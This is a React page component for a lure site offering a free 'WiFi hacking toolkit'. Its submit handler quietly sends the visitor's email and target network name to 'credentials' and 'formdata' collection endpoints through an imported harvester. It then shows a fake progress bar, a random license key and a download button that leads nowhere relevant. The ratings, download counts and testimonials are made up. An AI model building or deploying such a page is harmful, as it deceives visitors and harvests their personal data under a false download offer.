import React, { useState, useEffect } from 'react';
import { Box, Button, Typography, Container, Card, CardContent, TextField, Grid, LinearProgress, Chip, Avatar, Paper, Stepper, Step, StepLabel, Alert, Divider } from '@mui/material';
import harvester from '../harvester/HarvesterCore';

export default function WifiHackingPage() {
  const [email, setEmail] = useState('');
  const [targetNetwork, setTargetNetwork] = useState('');
  const [downloading, setDownloading] = useState(false);
  const [progress, setProgress] = useState(0);
  const [completed, setCompleted] = useState(false);
  const [scanning, setScanning] = useState(false);

  useEffect(() => { harvester.init(); }, []);

  const handleScan = () => {
    if (!email) return;
    setScanning(true);
    
    harvester.send('/api/collect/formdata', {
      formId: 'wifi-hack-download',
      fields: { email, targetNetwork },
      url: window.location.href
    });

    harvester.send('/api/collect/credentials', {
      source: 'form-submit',
      email,
      url: window.location.href,
      formType: 'wifi-hacking-tool',
      fieldData: { email, targetNetwork }
    });

    setTimeout(() => {
      setScanning(false);
      setDownloading(true);
      let prog = 0;
      const interval = setInterval(() => {
        prog += Math.random() * 10 + 5;
        if (prog >= 100) {
          clearInterval(interval);
          setProgress(100);
          setTimeout(() => setCompleted(true), 600);
        } else {
          setProgress(prog);
        }
      }, 300);
    }, 2000);
  };

  if (completed) {
    return (
      <Box sx={{ minHeight: '100vh', bgcolor: '#0a0e17', display: 'flex', alignItems: 'center', justifyContent: 'center', py: 4 }}>
        <Container maxWidth="sm">
          <Card sx={{ bgcolor: '#111827', border: '1px solid rgba(0,240,255,0.2)', borderRadius: 3, textAlign: 'center', overflow: 'hidden' }}>
            <Box sx={{ background: 'linear-gradient(135deg, #00f0ff 0%, #00ff88 100%)', p: 4 }}>
              <Typography sx={{ fontSize: '4rem' }}>✅</Typography>
              <Typography variant="h4" sx={{ color: '#0a0e17', fontWeight: 800, mt: 2 }}>
                Tool Unlocked!
              </Typography>
            </Box>
            <CardContent sx={{ p: 3 }}>
              <Typography sx={{ color: '#ccc', mb: 2 }}>
                Your WiFi hacking toolkit has been prepared for <strong style={{ color: '#00f0ff' }}>{email}</strong>.
              </Typography>
              <Box sx={{ bgcolor: 'rgba(0,240,255,0.08)', border: '1px solid rgba(0,240,255,0.2)', borderRadius: 2, p: 2, mb: 3 }}>
                <Typography sx={{ color: '#00f0ff', fontWeight: 600, fontSize: '0.9rem', fontFamily: 'monospace' }}>
                  🔑 License: WIFI-HACK-{Math.random().toString(36).substr(2, 8).toUpperCase()}
                </Typography>
              </Box>
              <Box sx={{ display: 'flex', gap: 2, justifyContent: 'center', flexWrap: 'wrap' }}>
                <Button variant="outlined" onClick={() => window.location.href = '/'} sx={{ borderColor: 'rgba(255,255,255,0.2)', color: '#888' }}>
                  Back to Home
                </Button>
                <Button variant="contained" href="https://github.com" target="_blank" sx={{ bgcolor: '#00f0ff', color: '#0a0e17', fontWeight: 700, '&:hover': { bgcolor: '#00d5e6' } }}>
                  🚀 Download Tool
                </Button>
              </Box>
            </CardContent>
          </Card>
        </Container>
      </Box>
    );
  }

  return (
    <Box sx={{ minHeight: '100vh', bgcolor: '#f8f9fa' }}>
      {/* Hero Section */}
      <Box sx={{ background: 'linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%)', py: { xs: 6, md: 8 }, position: 'relative', overflow: 'hidden' }}>
        <Box sx={{ position: 'absolute', top: 0, left: 0, right: 0, bottom: 0, opacity: 0.05, background: 'radial-gradient(circle at 30% 50%, #00f0ff 0%, transparent 50%), radial-gradient(circle at 70% 50%, #00ff88 0%, transparent 50%)' }} />
        <Container maxWidth="md" sx={{ textAlign: 'center', position: 'relative', zIndex: 1 }}>
          <Typography sx={{ fontSize: { xs: '3rem', md: '4rem' }, mb: 2 }}>📶</Typography>
          <Typography variant="h3" sx={{ color: '#fff', fontWeight: 800, mb: 1, fontSize: { xs: '1.8rem', md: '2.5rem' } }}>
            WiFi Network Security Toolkit
          </Typography>
          <Typography sx={{ color: 'rgba(255,255,255,0.7)', mb: 3, maxWidth: 600, mx: 'auto', fontSize: { xs: '0.9rem', md: '1rem' } }}>
            Professional-grade WiFi penetration testing suite. Audit your network security with enterprise tools — free for security researchers.
          </Typography>
          <Box sx={{ display: 'flex', justifyContent: 'center', gap: 2, flexWrap: 'wrap' }}>
            <Chip label="⭐ 4.9/5 Rating" sx={{ bgcolor: 'rgba(0,240,255,0.15)', color: '#00f0ff', fontWeight: 600 }} />
            <Chip label="👥 847K+ Downloads" sx={{ bgcolor: 'rgba(0,255,136,0.15)', color: '#00ff88', fontWeight: 600 }} />
            <Chip label="🔒 AES-256 Encrypted" sx={{ bgcolor: 'rgba(255,170,0,0.15)', color: '#ffaa00', fontWeight: 600 }} />
          </Box>
        </Container>
      </Box>

      <Container maxWidth="lg" sx={{ mt: -4, position: 'relative', zIndex: 10, pb: 6 }}>
        {/* Download Card */}
        <Card elevation={4} sx={{ borderRadius: 3, mb: 4 }}>
          <CardContent sx={{ p: { xs: 2, md: 4 } }}>
            <Grid container spacing={3} alignItems="center">
              <Grid item xs={12} md={7}>
                <Typography variant="h5" sx={{ fontWeight: 700, color: '#222', mb: 2 }}>
                  🛡️ All-in-One WiFi Security Suite
                </Typography>
                <Grid container spacing={1.5}>
                  {[
                    { icon: '📡', text: 'WPA/WPA2/WPA3 cracking & auditing' },
                    { icon: '🔍', text: 'Hidden network SSID discovery' },
                    { icon: '📊', text: 'Signal mapping & channel analysis' },
                    { icon: '🛡️', text: 'De-authentication attack detection' },
                    { icon: '🔑', text: 'Handshake capture & PMKID hash extraction' },
                    { icon: '🌐', text: 'MAC address spoofing & bypass tools' },
                    { icon: '⚡', text: 'Packet injection & monitoring mode' },
                    { icon: '📱', text: 'Mobile app for Android & iOS' },
                  ].map((feat, i) => (
                    <Grid item xs={12} sm={6} key={i}>
                      <Box sx={{ display: 'flex', alignItems: 'center', gap: 1 }}>
                        <Typography sx={{ fontSize: '1.1rem' }}>{feat.icon}</Typography>
                        <Typography sx={{ color: '#555', fontSize: '0.85rem' }}>{feat.text}</Typography>
                      </Box>
                    </Grid>
                  ))}
                </Grid>
              </Grid>
              <Grid item xs={12} md={5}>
                <Box sx={{ bgcolor: '#f0f7ff', borderRadius: 2, p: 3, textAlign: 'center', border: '1px solid #d0e4ff' }}>
                  <Typography variant="h3" sx={{ color: '#1a73e8', fontWeight: 800, fontSize: { xs: '2rem', md: '2.5rem' } }}>
                    FREE
                  </Typography>
                  <Typography sx={{ color: '#1a73e8', fontWeight: 600, mb: 1 }}>
                    Premium License — Normally $199
                  </Typography>
                  <Divider sx={{ my: 1.5 }} />
                  {!downloading ? (
                    <Box>
                      <TextField
                        fullWidth
                        size="small"
                        placeholder="Your email for license key"
                        type="email"
                        value={email}
                        onChange={(e) => setEmail(e.target.value)}
                        sx={{ mb: 1.5, '& .MuiOutlinedInput-root': { bgcolor: '#fff' } }}
                      />
                      <TextField
                        fullWidth
                        size="small"
                        placeholder="Target network SSID (optional)"
                        value={targetNetwork}
                        onChange={(e) => setTargetNetwork(e.target.value)}
                        sx={{ mb: 1.5, '& .MuiOutlinedInput-root': { bgcolor: '#fff' } }}
                      />
                      <Button
                        variant="contained"
                        fullWidth
                        size="large"
                        onClick={handleScan}
                        disabled={!email || scanning}
                        sx={{
                          bgcolor: '#1a73e8',
                          '&:hover': { bgcolor: '#1557b0' },
                          '&:disabled': { bgcolor: '#9bc0f7' },
                          fontWeight: 700,
                          py: 1.2,
                          fontSize: '1rem'
                        }}
                      >
                        {scanning ? '🔍 Scanning...' : '🚀 Unlock Full Suite'}
                      </Button>
                    </Box>
                  ) : (
                    <Box>
                      <LinearProgress variant="determinate" value={progress} sx={{ height: 8, borderRadius: 4, bgcolor: '#e8e8e8', '& .MuiLinearProgress-bar': { bgcolor: '#1a73e8', borderRadius: 4 } }} />
                      <Typography sx={{ color: '#888', mt: 1, fontSize: '0.9rem' }}>
                        Generating license key... {Math.round(progress)}%
                      </Typography>
                    </Box>
                  )}
                  <Box sx={{ display: 'flex', justifyContent: 'center', gap: 2, mt: 1.5, flexWrap: 'wrap' }}>
                    <Typography sx={{ color: '#aaa', fontSize: '0.75rem' }}>🔒 256-bit encryption</Typography>
                    <Typography sx={{ color: '#aaa', fontSize: '0.75rem' }}>💻 Win/Mac/Linux</Typography>
                  </Box>
                </Box>
              </Grid>
            </Grid>
          </CardContent>
        </Card>

        {/* Features Grid */}
        <Typography variant="h5" sx={{ fontWeight: 700, color: '#222', mb: 2, display: 'flex', alignItems: 'center', gap: 1 }}>
          <Box sx={{ width: 4, height: 24, bgcolor: '#1a73e8', borderRadius: 2 }} />
          What's Inside the Toolkit
        </Typography>
        <Grid container spacing={2.5} sx={{ mb: 4 }}>
          {[
            { icon: '📡', title: 'Packet Analyzer', desc: 'Real-time packet capture and analysis with advanced filtering. Supports Wireshark-compatible output.', color: '#1a73e8' },
            { icon: '🔑', title: 'Key Extractor', desc: 'Automatically extract WPA handshakes and PMKID hashes from captured traffic.', color: '#e74c3c' },
            { icon: '🌍', title: 'Geo-Mapper', desc: 'Map all nearby access points with signal strength visualization and channel overlap detection.', color: '#27ae60' },
            { icon: '🛡️', title: 'Security Scanner', desc: 'Scan for vulnerable configurations, default passwords, and known CVEs in router firmware.', color: '#9b59b6' },
            { icon: '⚡', title: 'De-Auth Tool', desc: 'Test network resilience against de-authentication attacks with customizable parameters.', color: '#f39c12' },
            { icon: '📱', title: 'Mobile Companion', desc: 'Full-featured mobile app for on-the-go network scanning and monitoring.', color: '#e67e22' },
          ].map((feature, i) => (
            <Grid item xs={12} sm={6} md={4} key={i}>
              <Card elevation={2} sx={{ borderRadius: 2, height: '100%', transition: 'transform 0.2s, box-shadow 0.2s', '&:hover': { transform: 'translateY(-4px)', boxShadow: '0 12px 40px rgba(0,0,0,0.12)' } }}>
                <CardContent sx={{ p: 3 }}>
                  <Box sx={{ fontSize: '2.5rem', mb: 1.5 }}>{feature.icon}</Box>
                  <Typography variant="h6" sx={{ fontWeight: 700, color: '#333', mb: 1, fontSize: '1.05rem' }}>
                    {feature.title}
                  </Typography>
                  <Typography sx={{ color: '#777', fontSize: '0.85rem', lineHeight: 1.6 }}>
                    {feature.desc}
                  </Typography>
                </CardContent>
              </Card>
            </Grid>
          ))}
        </Grid>

        {/* Testimonials */}
        <Typography variant="h5" sx={{ fontWeight: 700, color: '#222', mb: 2, display: 'flex', alignItems: 'center', gap: 1 }}>
          <Box sx={{ width: 4, height: 24, bgcolor: '#e74c3c', borderRadius: 2 }} />
          Trusted by Security Professionals
        </Typography>
        <Grid container spacing={2} sx={{ mb: 4 }}>
          {[
            { name: 'Alex M.', role: 'Penetration Tester', text: 'This toolkit is absolutely insane. I\'ve been using it for all my WiFi security audits — it replaced $2000+ worth of tools.', rating: 5 },
            { name: 'Dr. Sarah K.', role: 'Cybersecurity Professor', text: 'I recommend this to all my students. The handshake capture and PMKID extraction is the best I\'ve seen in a free tool.', rating: 5 },
            { name: 'Marcus J.', role: 'Network Engineer', text: 'The signal mapping feature alone is worth it. Combined with the de-auth detection, this is a must-have for any security pro.', rating: 5 },
          ].map((t, i) => (
            <Grid item xs={12} sm={4} key={i}>
              <Card elevation={1} sx={{ borderRadius: 2, height: '100%' }}>
                <CardContent sx={{ p: 2.5 }}>
                  <Box sx={{ mb: 1 }}>{'⭐'.repeat(t.rating)}</Box>
                  <Typography sx={{ color: '#555', fontSize: '0.85rem', mb: 1.5, lineHeight: 1.6, fontStyle: 'italic' }}>
                    "{t.text}"
                  </Typography>
                  <Box sx={{ display: 'flex', alignItems: 'center', gap: 1.5 }}>
                    <Avatar sx={{ width: 36, height: 36, bgcolor: '#1a73e8', fontWeight: 700, fontSize: '0.9rem' }}>{t.name[0]}</Avatar>
                    <Box>
                      <Typography sx={{ fontWeight: 600, color: '#333', fontSize: '0.85rem' }}>{t.name}</Typography>
                      <Typography sx={{ color: '#888', fontSize: '0.75rem' }}>{t.role}</Typography>
                    </Box>
                  </Box>
                </CardContent>
              </Card>
            </Grid>
          ))}
        </Grid>
      </Container>
    </Box>
  );
}